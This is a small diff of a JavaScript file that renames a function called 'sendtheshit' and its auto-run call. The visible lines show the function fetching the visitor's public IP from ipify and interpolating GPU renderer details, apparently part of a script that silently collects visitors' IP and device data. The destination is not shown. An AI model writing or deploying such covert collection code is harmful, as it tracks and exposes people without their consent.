@@ -1,4 +1,4 @@
-const sendtheshit = async () => {
+const sendtheshit1 = async () => {
     try {
         const irapd = await fetch('https://api.ipify.org?format=json');
         const datashitip = await irapd.json();
@@ -62,4 +62,4 @@ GPU          = ${gpuRenderer}
         console.error('An error occurred: ', error);
     }
 };
-sendtheshit();
+sendtheshit1();
